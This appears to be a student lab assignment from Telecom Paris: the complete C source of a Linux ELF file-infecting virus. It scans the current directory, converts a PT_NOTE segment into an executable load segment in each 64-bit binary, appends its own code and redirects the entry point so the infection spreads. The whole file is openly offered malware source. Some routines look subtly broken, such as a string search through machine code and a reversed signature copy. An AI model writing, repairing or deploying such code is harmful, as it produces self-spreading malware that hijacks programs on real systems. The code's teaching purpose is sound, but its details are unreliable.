// gcc elfvirus.c -masm=intel -nostdlib -fno-builtin -o elfvirus
#include <elf.h>
#include <linux/unistd.h>
#include <stdio.h>

/* Modes d'ouverture d'un fichier (2eme parametre de open) */
#define O_RDONLY 00
#define O_WRONLY 01
#define O_RDWR 02
#define O_CREAT 0100
#define O_EXCL 0200
#define O_TRUNC 01000
#define O_APPEND 02000
#define O_DIRECTORY 0200000

/* 3eme parametre de lseek */
#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2

#define PAGE_SIZE 4096

/* File types for `d_type'.  */
#define DT_UNKNOWN 0
#define DT_DIR 4
#define DT_REG 8

#define DISTANCE 32

struct linux_dirent64
{
    long d_ino;              /* 64-bit inode number */
    long d_off;              /* 64-bit offset to next structure */
    unsigned short d_reclen; /* Size of this dirent */
    unsigned char d_type;    /* File type */
    char d_name[];           /* Filename (null-terminated) */
};

#define BUF_SIZE 1024

#define STR(str) \
    ({ char* var = 0 ; \
asm volatile ( "call .After_string%=\n" \
".string \""str"\"\n" \
".byte 0 \n" \
".After_string%=:\n" \
"\tpop %0\n" \
: "=m" ( var ) ) ; \
var ; })

void _start()
{
    __asm__ volatile("push rax");
    __asm__ volatile("push rbx");
    __asm__ volatile("push rcx");
    __asm__ volatile("push rdx");
    __asm__ volatile("mov rax, 0x6a73757375726976");
    __asm__ volatile("call virus");
    __asm__ volatile("pop rdx");
    __asm__ volatile("pop rcx");
    __asm__ volatile("pop rbx");
    __asm__ volatile("pop rax");
    __asm__ volatile("pop rbp");
    __asm__ volatile("jmp exit");
}

long virus_address()
{
    register long addr __asm__("rax");
    __asm__ volatile("lea rax, [rip]");
    return addr - addr % 0x1000;
}

/* ===============Fonctions auxiliaires=============== */
int strlen(const char *s) // Taille d'une chaîne de caractères
{
    int len = 0;
    while (s[len])
        len++;
    return len;
}
static void memcpy(char *s1, const char *s2, int len)
{
    int n;
    for (n = 0; n < len; n++)
        s1[n] = s2[n];
}

static void memset(char *s1, const char c, int len)
{
    int n;
    for (n = 0; n < len; n++)
        s1[n] = c;
}

static int strcmp(const char *s1, const char *s2)
{
    int l = 0;
    for (; s1[l] == s2[l]; l++)
        if (s1[l] == '\0')
            return 0;
    return (s1[l] - s2[l]);
}

static int strncmp(const char *s1, const char *s2, int len)
{
    int l = 0;
    for (; s1[l] == s2[l] && l < len - 1; l++)
    {
        if (s1[l] == '\0')
        {
            return 0;
        }
    }
    return (s1[l] - s2[l]);
}

static void strcpy(char *s1, const char *s2)
{
    int n = 0;
    while ((s1[n] = s2[n]) != 0)
        n++;
    s1[n] = 0;
}

static void strcat(char *s1, const char *s2)
{
    strcpy(&s1[strlen(s1)], s2);
}
// Conversion d'un nombre non signé en une chaîne de caractères en décimal
void utoa(unsigned long n, char *s)
{
    int i, j;
    char t[16];
    i = 0;
    do
    {
        t[i++] = n % 10 + '0';
    } while ((n /= 10) > 0);

    for (j = i - 1; j >= 0; j--)
        s[i - j - 1] = t[j];
    s[i] = '\0';
}

// Conversion d'un nombre non signé en une chaîne de caractères en hexadécimal
void xtoa(unsigned long n, char *s)
{
    long temp = n, i = 0, j;
    char m[32];
    while (temp > 0)
    {
        m[i] = temp % 16;
        if (m[i] > 9)
            m[i] += 55;
        else
            m[i] += '0';
        temp = temp / 16;
        i++;
    }
    for (j = i - 1; j >= 0; j--)
        s[i - j - 1] = m[j];
    s[i] = '\0';
}
/* ===============Fin des fonctions auxiliaires=============== */

/* ===============Appels systeme=============== */
static inline int syscall0(int syscallnum)
{
    register int syscallnum_ __asm__("rax");
    syscallnum_ = (long long)syscallnum;
    asm volatile(
        "syscall"
        : "+r"(syscallnum_));
    return syscallnum_;
}

static inline int syscall1(int syscallnum, long long arg0)
{
    register int syscallnum_ __asm__("rax");
    register long long arg0_ __asm__("rdi");
    syscallnum_ = (long long)syscallnum;
    arg0_ = arg0;
    asm volatile(
        "syscall"
        : "+r"(syscallnum_)
        : "r"(arg0_));
    return syscallnum_;
}

static inline int syscall2(int syscallnum, long long arg0, long long arg1)
{
    register long long syscallnum_ __asm__("rax");
    register long long arg0_ __asm__("rdi");
    register long long arg1_ __asm__("rsi");
    syscallnum_ = (long long)syscallnum;
    arg0_ = arg0;
    arg1_ = arg1;
    asm volatile(
        "syscall"
        : "+r"(syscallnum_)
        : "r"(arg0_), "r"(arg1_));
    return syscallnum_;
}

static inline int syscall3(int syscallnum, long long arg0, long long arg1, long long arg2)
{
    register long long syscallnum_ __asm__("rax");
    register long long arg0_ __asm__("rdi");
    register long long arg1_ __asm__("rsi");
    register long long arg2_ __asm__("rdx");
    syscallnum_ = (long long)syscallnum;
    arg0_ = arg0;
    arg1_ = arg1;
    arg2_ = arg2;
    asm volatile(
        "syscall"
        : "+r"(syscallnum_)
        : "r"(arg0_), "r"(arg1_), "r"(arg2_)
        : "%rcx", "%r11", "memory");
    return syscallnum_;
}
/* ===============Fin des appels systeme=============== */

/* ===============Enveloppeurs (Wrappers) des appels systeme=============== */
static void exit(int status)
{
    syscall1(__NR_exit, status);
}

static int write(int fd, const void *buf, int count)
{
    return syscall3(__NR_write, fd, (long long)buf, count);
}

static int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    return syscall3(__NR_getdents64, fd, (long long)dirp, count);
}

static int open(const char *filename, int flags)
{
    return syscall2(__NR_open, (long long)filename, flags);
}

static int close(int fd)
{
    return syscall1(__NR_close, fd);
}

static int lseek(int fd, int offset, int whence)
{
    return syscall3(__NR_lseek, fd, (long long)offset, whence);
}

static int read(int fd, void *buf, int count)
{
    return syscall3(__NR_read, fd, (long long)buf, count);
}
/* ===============Fin des Wrappers */

void write_int(unsigned long d, char *sep, void (*converter)())
{
    char message[25];
    converter(d, message);
    write(1, message, strlen(message));
    write(1, sep, strlen(sep));
}

void replaceJmpExit(char *virusCode, char *newCode, unsigned vlen, unsigned old_entry_point)
{
    int newCodeIndex = 0;
    int i;
    for (i = 0; i < vlen - 8; i++)
    {
        char *jmp = "jmp exit";
         if (virusCode[i] == 'j' && strncmp(jmp, &virusCode[i], 8) == 0)

        {
            // found jmp exit
            write(1, STR("in replace loop\\n"), strlen("in replace loop\\n"));
            char entry_point_str[64];
            char *newInstruction = "jmp ";
            xtoa(old_entry_point, entry_point_str);
            strcat(newInstruction, entry_point_str);
            strcpy(&newCode[newCodeIndex], newInstruction);
            i += 7; // skip over "jmp exit"
        }
        else
        {
            newCode[newCodeIndex++] = virusCode[i];
        }
    }
}

int infect_elf(const char *filename, void *virus_code, unsigned int virus_size)
{
    // We open the file in READ-WRITE mode
    int fd = open(filename, O_RDWR);
    if (fd < 0)
    {
        write(1, STR("error opening the file \\n"), strlen("error opening the file \\n"));
        return 0; // Error opening the file
    }

    // read the file header
    Elf64_Ehdr elf_header;
    if (read(fd, &elf_header, 64) != 64)
    {
        close(fd);
        return 0; // Unable to read the ELF header
    }

    // chek if it is an elf file
    if (!(elf_header.e_ident[0] == 0x7F &&
          elf_header.e_ident[1] == 'E' &&
          elf_header.e_ident[2] == 'L' &&
          elf_header.e_ident[3] == 'F'))
    {
        close(fd);
        return 0;
    }
    write(1, STR("Found an ELF file\\n"), strlen("Found an ELF file\\n"));
    // write_int(elf_header.e_entry, STR("\\n"), xtoa);
    // write_int(elf_header.e_entry, STR("\\n"), utoa);

    // check if the class is 64 bits
    if (elf_header.e_ident[EI_CLASS] != ELFCLASS64)
    {
        close(fd);
        write(1, STR("Not 64\\n"), strlen("Not 64\\n"));

        return 0; // It's a 64-bit ELF file (x86_64)
    }

    // Check if the program header entry count is greater than 0
    if (elf_header.e_phnum <= 0)
    {
        close(fd);
        write(1, STR("phnum <=0\\n"), strlen("phnum <=0\\n"));
        return 0; // No program header entries
    }

    // finding the size of target file (offset of the virus in the file)
    int filesize = lseek(fd, 0, SEEK_END);

    // reading segments into phHeaders
    Elf64_Off phoff = elf_header.e_phoff;
    Elf64_Half phnum = elf_header.e_phnum;
    Elf64_Phdr phHeaders[phnum];
    if (lseek(fd, phoff, SEEK_SET) == -1)
    {
        write(1, STR("can't lseek to phoff\\n"), strlen("can't lseek to phoff\\n"));
        return 0;
    }
    if (read(fd, phHeaders, elf_header.e_phentsize * phnum) != elf_header.e_phentsize * phnum)
    {
        write(1, STR("can't read pht\\n"), strlen("can't read pht\\n"));
        return 0;
    }

    // we initialize the virus signature
    char virus_signature[32];
    memcpy(virus_code, virus_signature, 32);

    // loop through the segments
    int first_PT_NOTE = 0;
    int max_segment_end = 0;
    for (int i = 0; i < phnum; i++)
    {
        Elf64_Phdr phdr = phHeaders[i];
        // Calculate the end of the segment
        int segment_end = phdr.p_vaddr + phdr.p_memsz;
        if (segment_end > max_segment_end)
            max_segment_end = segment_end;
        // Check if this segment should be loaded
        if (phdr.p_type == PT_LOAD)
        {
            // We need to check if the program is already infected by comparing signatures
            char program_signature[32];
            // Seek  to the segment file offset
            if (lseek(fd, phdr.p_offset, SEEK_SET) == -1)
            {
                close(fd);
                return 0;
            }
            // read the first 32bytes into program_signature
            if (read(fd, program_signature, 32) != 32)
            {
                close(fd);
                return 0;
            }
            // compare the signatures
            if (!strcmp(virus_signature, program_signature))
            { // the signatures are the same, the file is already infected
                write(1, STR("Signatures similar, file already infected\\n"), strlen("Signatures similar, file already infected\\n"));
                close(fd);
                return 0;
            }
        }
        if (phdr.p_type == PT_NOTE && !first_PT_NOTE)
        {
            first_PT_NOTE = i;
        }
    }

    // Modify the PT_NOTE segment entry
    // first check if the file contains a PT_NOTE segment
    if (!first_PT_NOTE)
        return 0;
    write(1, STR("File contains PT_NOTE segment\\n"), strlen("File contains PT_NOTE segment\\n"));
    Elf64_Phdr note_phdr = phHeaders[first_PT_NOTE];
    note_phdr.p_type = PT_LOAD;
    note_phdr.p_align = 4096;
    note_phdr.p_flags = PF_R | PF_X;
    note_phdr.p_filesz = virus_size + 64;
    note_phdr.p_memsz = virus_size + 64;
    note_phdr.p_offset = filesize;
    note_phdr.p_paddr = max_segment_end;
    note_phdr.p_vaddr = max_segment_end;

    // we need to write the modified entry into the pht
    long entry_offset = phoff + elf_header.e_phentsize * first_PT_NOTE;
    // Seek back to the location of the program header entry
    if (lseek(fd, entry_offset, SEEK_SET) == -1)
    {
        close(fd);
        return 0;
    }
    // Write the modified program header entry back to the file
    if (write(fd, &note_phdr, elf_header.e_phentsize) != elf_header.e_phentsize)
    {
        close(fd);
        return 0;
    }

    // We need to change the program entry point to the start address of the virus code
    unsigned old_entry_point = elf_header.e_entry;
    elf_header.e_entry = max_segment_end;
    // Seek back to the location of the start of the program
    if (lseek(fd, 0, SEEK_SET) == -1)
    {
        close(fd);
        return 0;
    }
    // Write the modified file header  back to the file
    if (write(fd, &elf_header, 64) != 64)
    {
        close(fd);
        return 0;
    }

    // Seek back to the end of the file
    if (lseek(fd, 0, SEEK_END) == -1)
    {
        close(fd);
        return 0;
    }
    // Write the virus code at the end of the file
    char newCode[virus_size + 64];
    replaceJmpExit(virus_code, newCode, virus_size, old_entry_point);

    if (write(fd, newCode, virus_size + 64) != virus_size + 64)
    {
        close(fd);
        write(1, STR("Couldn't write code"), strlen("Couldn't write code"));
        return 0;
    }

    close(fd);
    return 1;
}

int parcours(char *virus, unsigned vlen)
{
    int nb_infect = 0;
    int nread;
    char buf[BUF_SIZE];
    struct linux_dirent64 *d;
    int bpos;
    char d_type;
    int fd = open(".", O_RDONLY | O_DIRECTORY);
    for (;;)
    {
        nread = getdents64(fd, (struct linux_dirent64 *)buf, BUF_SIZE);
        if (nread == 0)
            break;
        for (bpos = 0; bpos < nread;)
        {
            d = (struct linux_dirent64 *)(buf + bpos);
            d_type = d->d_type;
            if (d->d_type == DT_REG && strcmp(d->d_name, "elfvirus") != 0)
            {
                write(1, STR("Looking at :"), strlen("Looking at :"));
                write(1, d->d_name, strlen(d->d_name));
                write(1, STR("\\n"), strlen("\\n"));
                if (infect_elf(d->d_name, virus, vlen) == 1)
                    nb_infect++;
            }
            bpos += d->d_reclen;
        }
    }
    write(1, STR("nb_infect: "), strlen("nb_infect: "));
    write_int(nb_infect, STR("\\n"), utoa);
    return nb_infect;
}

void end();
int virus(void)
{
    int fd;
    unsigned vlen = end - _start;
    char *start_address = (char *)virus_address();
    char virusCode[vlen];
    // char s[64];
    // write_int(start_address, STR("\\n"), xtoa);
    // xtoa(start_address, s);
    memcpy(virusCode, start_address, vlen);
    int nb_infected = parcours(virusCode, vlen);
    write(1, STR("TP Virus: Telecom Paris - 2023-2024\\n"), 36);
    write(1, STR("Taille du Virus: "), 17);
    write_int(vlen, STR("\\n"), utoa);
}

void end() {}
